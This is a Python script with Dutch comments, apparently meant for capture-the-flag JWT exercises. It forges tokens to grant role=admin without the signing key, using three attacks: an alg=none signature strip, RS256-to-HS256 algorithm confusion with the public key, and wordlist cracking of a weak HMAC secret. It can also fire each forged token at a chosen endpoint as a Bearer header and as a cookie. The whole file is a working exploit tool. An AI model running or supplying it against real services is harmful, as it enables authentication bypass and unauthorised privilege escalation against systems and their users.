"""
jwt_forge.py - JWT-opgaven oplossen: ontleden, vervalsen, en optioneel afvuren.
Geen externe libraries nodig (alleen de Python-standaardbibliotheek).

JWT = header.payload.signature  (elk base64url).
Doel: een veld als role=user -> role=admin krijgen ZONDER de sleutel.

AANVALLEN
  1) alg=none      : alg -> none/None/NONE, lege handtekening. (geen sleutel nodig)
  2) alg-confusion : server verwacht RS256; teken HS256 met de PUBLIEKE sleutel.
  3) zwak geheim   : HMAC-secret kraken met een woordenlijst (als 't mag/moet).

GEBRUIK
  python3 jwt_forge.py <token>                                  # ontleed
  python3 jwt_forge.py <token> --set role=admin                 # forge (toon tokens)
  python3 jwt_forge.py <token> --set role=admin \
        --url http://host:port/admin                            # forge EN afvuren
  python3 jwt_forge.py <token> --set role=admin --pubkey pub.pem
  python3 jwt_forge.py <token> --crack rockyou.txt              # zwak geheim kraken
"""
import sys, json, base64, hashlib, hmac, argparse, urllib.request, urllib.error

def b64d(s): return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
def b64e(b): return base64.urlsafe_b64encode(b).decode().rstrip("=")
def j(o):    return json.dumps(o, separators=(",", ":"))

def decode(tok):
    parts = tok.split(".")
    return json.loads(b64d(parts[0])), json.loads(b64d(parts[1])), (parts[2] if len(parts) > 2 else "")

def coerce(v):
    if v in ("true", "false"): return v == "true"
    if v.lstrip("-").isdigit(): return int(v)
    return v

def tok_none(header, payload, alg):
    h = dict(header); h["alg"] = alg
    return b64e(j(h).encode()) + "." + b64e(j(payload).encode()) + "."

def tok_hs(header, payload, secret):
    h = dict(header); h["alg"] = "HS256"
    signing = b64e(j(h).encode()) + "." + b64e(j(payload).encode())
    sig = hmac.new(secret, signing.encode(), hashlib.sha256).digest()
    return signing + "." + b64e(sig)

def crack_secret(tok, wordlist):
    signing, _, sig = tok.rpartition(".")
    want = sig
    with open(wordlist, "rb") as f:
        for line in f:
            pw = line.rstrip(b"\r\n")
            calc = b64e(hmac.new(pw, signing.encode(), hashlib.sha256).digest())
            if calc == want:
                return pw.decode(errors="replace")
    return None

def fire(url, token):
    """Stuur token als Bearer én als cookie; toon per vorm de respons."""
    for naam, req in [
        ("Bearer header", urllib.request.Request(url, headers={"Authorization": "Bearer " + token})),
        ("Cookie token",  urllib.request.Request(url, headers={"Cookie": "token=" + token})),
    ]:
        try:
            r = urllib.request.urlopen(req, timeout=10)
            body = r.read().decode(errors="replace")
            print(f"  [{naam}] {r.status}: {body[:200]}")
        except urllib.error.HTTPError as e:
            print(f"  [{naam}] {e.code}: {e.read().decode(errors='replace')[:200]}")
        except Exception as e:
            print(f"  [{naam}] fout: {e}")

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("token")
    ap.add_argument("--set", action="append", default=[], help="veld=waarde")
    ap.add_argument("--pubkey", help="PEM publieke sleutel (alg-confusion)")
    ap.add_argument("--crack", help="woordenlijst om zwak HMAC-geheim te kraken")
    ap.add_argument("--url", help="endpoint; vuurt elk vervalst token automatisch af")
    a = ap.parse_args()

    header, payload, sig = decode(a.token)
    print("HEADER :", header)
    print("PAYLOAD:", payload)

    if a.crack:
        s = crack_secret(a.token, a.crack)
        print("\nGEHEIM:", s if s else "(niet in de lijst)")
        if s and a.set:
            for kv in a.set: k, v = kv.split("=", 1); payload[k] = coerce(v)
            t = tok_hs(header, payload, s.encode())
            print("Getekend token met gekraakt geheim:", t)
            if a.url: print("Afvuren:"); fire(a.url, t)
        sys.exit(0)

    if not a.set:
        print("\nTip: --set role=admin om te forgen; voeg --url toe om af te vuren.")
        sys.exit(0)

    for kv in a.set: k, v = kv.split("=", 1); payload[k] = coerce(v)
    print("Nieuwe payload:", payload)

    kandidaten = [(f"alg={al}", tok_none(header, payload, al)) for al in ("none", "None", "NONE")]
    if a.pubkey:
        pem = open(a.pubkey, "rb").read()
        kandidaten.append(("alg-confusion HS256+pubkey", tok_hs(header, payload, pem)))

    for naam, tok in kandidaten:
        print(f"\n[{naam}]\n{tok}")
        if a.url:
            fire(a.url, tok)